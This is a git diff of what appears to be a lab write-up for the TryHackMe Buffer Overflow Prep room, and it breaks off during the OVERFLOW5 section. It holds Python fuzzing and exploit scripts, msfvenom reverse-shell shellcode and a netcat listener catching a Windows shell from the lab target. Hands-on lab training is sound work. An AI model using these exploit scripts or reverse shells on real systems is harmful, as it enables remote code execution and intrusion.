+= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW4/0f4_0x01.py
 [*] Sending: 1
 [*] Sending: 100
 [*] Sending: 200
@@ -1969,9 +1957,9 @@ Run the code and observe the breakpoint.
 [*] Sending: 1800
 [*] Sending: 1900
 [*] Sending: 2000
-[*] Sending: 2100 
-```
-{% endraw %}
+[*] Sending: 2100
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of4findbreakpoint %}
 
 <br />
 Check the EIP to ensure that we have control of EIP.
@@ -1985,8 +1973,7 @@ Check the EIP to ensure that we have control of EIP.
 <br />
 Update the script to hardcode the size that breaks the buffer.
 
-{% raw %}
-```python
+{% capture 0f402 %}
 import socket
 
 url = '10.0.0.7'
@@ -2003,8 +1990,8 @@ print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW4 ' + inputBuffer + b'\r\n')
 
 s.close()
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='0f4_0x02.py' content=0f402 %}
 
 <br />
 Run the code and check EIP to ensure that we still have control.
@@ -2018,19 +2005,17 @@ Run the code and check EIP to ensure that we still have control.
 <br />
 Generate msf-pattern_create to create a string to determine offset.
 
-{% raw %}
-```bash
+{% capture of4patterncreate %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW4]
 └─$ msf-pattern_create -l 2500
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D 
-```
-{% endraw %}
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of4patterncreate %}
 
 <br />
 Update the code with the pattern_create string that we just generated.
 
-{% raw %}
-```python
+{% capture 0f403 %}
 import socket
 
 url = '10.0.0.7'
@@ -2047,9 +2032,9 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW4 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='0f4_0x03.py' content=0f403 %}
 
 <br />
 Check the EIP and note the value that is stored in the register.
@@ -2063,19 +2048,17 @@ Check the EIP and note the value that is stored in the register.
 <br />
 Run the string from the regster through msf-pattern_offset to get the exact offset.
 
-{% raw %}
-```bash
+{% capture of4findoffset %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW4]
 └─$ msf-pattern_offset -l 2500 -q 70433570
 [*] Exact match at offset 2026
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of4findoffset %}
 
 <br />
 Update the code to include the offset value that we just calculated.
 
-{% raw %}
-```python
+{% capture 0f404 %}
 import socket
 
 url = '10.0.0.7'
@@ -2093,15 +2076,14 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW4 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='0f4_0x04.py' content=0f404 %}
 
 <br />
 Run the script and view the 42s in EIP.  Update the code with a list of all the badchars wo we can test them.
 
-{% raw %}
-```python
+{% capture 0f405 %}
 import socket
 
 url = '10.0.0.7'
@@ -2139,9 +2121,9 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW4 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='0f4_0x05.py' content=0f405 %}
 
 <br />
 Check the ESP register to view the baschars and find any mangles.
@@ -2155,8 +2137,7 @@ Check the ESP register to view the baschars and find any mangles.
 <br />
 Look for sections where the string drops, missing, or change.  Remove the bad character from the set.  Resend it and scan ESP for more bad characters.  Repeat until you have found them all.  Gotta catch 'em all.
 
-{% raw %}
-```python
+{% capture 0f406 %}
 import socket
 
 url = '10.0.0.7'
@@ -2197,8 +2178,8 @@ print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW4 ' + inputBuffer + b'\r\n')
 
 s.close()
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='0f4_0x06.py' content=0f406 %}
 
 <br />
 Update the code to change the badchars to payload = b'D' * 400 as a stub for the payload.  Then, in WinDBG, load the narly extension.
@@ -2221,8 +2202,7 @@ Run nmod to get a list of modules and their security to find the appropriate mod
 <br />
 Update the code with the address that was discovered in the essfunc.dll.
 
-{% raw %}
-```python
+{% capture 0f407 %}
 import socket
 from struct import pack
 
@@ -2246,15 +2226,14 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW4 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='0f4_0x07.py' content=0f407 %}
 
 <br />
 Use msfvenom to generate a payload.
 
-{% raw %}
-```bash
+{% capture of4generatepayload %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW4]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.6 LPORT=443 ExitFunc=thread -v shellcode -f python -b '\x00\xa9\xcd\xd4'
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -2297,15 +2276,14 @@ shellcode += b"\xfd\xda\x6f\x67\xce\xdc\xe9\x68\x1b\xab\x15"
 shellcode += b"\xd8\xf2\xea\x2a\xd5\x92\xfa\x53\x0b\x03\x04"
 shellcode += b"\x8e\x8f\x23\xe7\x1a\xfa\xcb\xbe\xcf\x47\x96"
 shellcode += b"\x40\x3a\x8b\xaf\xc2\xce\x74\x54\xda\xbb\x71"
-shellcode += b"\x10\x5c\x50\x08\x09\x09\x56\xbf\x2a\x18" 
-```
-{% endraw %}
+shellcode += b"\x10\x5c\x50\x08\x09\x09\x56\xbf\x2a\x18"
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of4generatepayload %}
 
 <br />
 Update the code with a nop sled and the payload we just generated.
 
-{% raw %}
-```python
+{% capture 0f408 %}
 import socket
 from struct import pack
 
@@ -2362,34 +2340,41 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW4 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='0f4_0x08.py' content=0f408 %}
 
 <br />
 Start a netcat listener.  Run the code.  Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture 0f4catchshell %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW4]
 └─$ sudo nc -nlvp 443                         
 [sudo] password for kali: 
 listening on [any] 443 ...
 connect to [10.0.0.6] from (UNKNOWN) [10.0.0.7] 56198
+{% endcapture %}
+
+{% capture 0f4windowsshell %}
 Microsoft Windows [Version 10.0.19045.3803]
 (c) Microsoft Corporation. All rights reserved.
 
 C:\Program Files\Windows Kits\10\Debuggers>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=0f4catchshell %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=0f4windowsshell %}
 
 <br />
-<b><u>OVERFLOW5<br /></u></b>
+<div id="overflow5">
+    <b><u>OVERFLOW5<br /></u></b>
+</div>
 
+<br />
 Create a script that connects to the service and sends the OVERFLOW5 command mimicking normal usage.
 
-{% raw %}
-```python
+{% capture of500 %}
 import socket
 
 url = '10.0.0.7'
@@ -2403,15 +2388,14 @@ print(s.recv(1024))
 s.send(b'OVERFLOW5 aaaa\r\n')
 print(s.recv(1024))
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of5_0x00.py' content=of500 %}
 
 <br />
 Update the code to fuzz the command with increasing length to find the breakpoint.
 
-{% raw %}
-```python
+{% capture of501 %}
 import socket
 
 url = '10.0.0.7'
@@ -2433,23 +2417,22 @@ for inputBuffer in buffers:
     s.send(b'OVERFLOW5 ' + inputBuffer + b'\r\n')
     s.recv(1024)
 
-    s.close() 
-```
-{% endraw %}
+    s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of5_0x01.py' content=of501 %}
 
 <br />
 Run the code and observe the breakpoint.
 
-{% raw %}
-```python
-= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW5/thm-overflow5_0x01.py
+{% capture of5findbreakpoint %}
+= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW5/of5findbreakpoint
 [*] Sending: 1
 [*] Sending: 100
 [*] Sending: 200
 [*] Sending: 300
 [*] Sending: 400
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of5findbreakpoint %}
 
 <br />
 Check the EIP to ensure that we have control of EIP.
@@ -2463,8 +2446,7 @@ Check the EIP to ensure that we have control of EIP.
 <br />
 Update the script to hardcode the size that breaks the buffer.
 
-{% raw %}
-```python
+{% capture of502 %}
 import socket
 
 url = '10.0.0.7'
@@ -2481,8 +2463,8 @@ print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW5 ' + inputBuffer + b'\r\n')
 
 s.close()
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of5_0x02.py' content=of502 %}
 
 <br />
 Run the code and check EIP to ensure that we still have control.
@@ -2496,19 +2478,17 @@ Run the code and check EIP to ensure that we still have control.
 <br />
 Generate msf-pattern_create to create a string to determine offset.
 
-{% raw %}
-```bash
+{% capture of5patterncreate %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW8]
 └─$ msf-pattern_create -l 800 
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba 
-```
-{% endraw %}
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of5patterncreate %}
 
 <br />
 Update the code with the pattern_create string that we just generated.
 
-{% raw %}
-```python
+{% capture of503 %}
 import socket
 
 url = '10.0.0.7'
@@ -2525,9 +2505,9 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW5 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of5_0x03.py' content=of503 %}
 
 <br />
 Check the EIP and note the value that is stored in the register.
@@ -2541,19 +2521,17 @@ Check the EIP and note the value that is stored in the register.
 <br />
 Run the string from the regster through msf-pattern_offset to get the exact offset.
 
-{% raw %}
-```bash
+{% capture of5findoffset %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW5]
 └─$ msf-pattern_offset -l 800 -q 356b4134 
 [*] Exact match at offset 314
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of5findoffset %}
 
 <br />
 Update the code to include the offset value that we just calculated.
 
-{% raw %}
-```python
+{% capture of504 %}
 import socket
 
 url = '10.0.0.7'
@@ -2571,15 +2549,14 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW5 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of5_0x04.py' content=of504 %}
 
 <br />
 Run the script and view the 42s in EIP.  Update the code with a list of all the badchars wo we can test them.
 
-{% raw %}
-```python
+{% capture of505 %}
 import socket
 
 url = '10.0.0.7'
@@ -2619,9 +2596,9 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW5 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of5_0x05.py' content=of505 %}
 
 <br />
 Check the ESP register to view the baschars and find any mangles.
@@ -2635,8 +2612,7 @@ Check the ESP register to view the baschars and find any mangles.
 <br />
 Look for sections where the string drops, missing, or change.  Remove the bad character from the set.  Resend it and scan ESP for more bad characters.  Repeat until you have found them all.  Gotta catch 'em all.
 
-{% raw %}
-```python
+{% capture of506 %}
 import socket
 
 url = '10.0.0.7'
@@ -2677,8 +2653,8 @@ print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW5 ' + inputBuffer + b'\r\n')
 
 s.close()
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of5_0x06.py' content=of506 %}
 
 <br />
 Update the code to change the badchars to payload = b'D' * 400 as a stub for the payload.  Then, in WinDBG, load the narly extension.
@@ -2701,8 +2677,7 @@ Run nmod to get a list of modules and their security to find the appropriate mod
 <br />
 Update the code with the address that was discovered in the essfunc.dll.
 
-{% raw %}
-```python
+{% capture of507 %}
 import socket
 from struct import pack
 
@@ -2726,15 +2701,14 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW5 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of5_0x07.py' content=of507 %}
 
 <br />
 Use msfvenom to generate a payload.
 
-{% raw %}
-```bash
+{% capture of5generatepayload %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW5]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.6 LPORT=443 ExitFunc=thread -f python -v payload -b '\x00\x16\x2f\xf4\xfd'
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
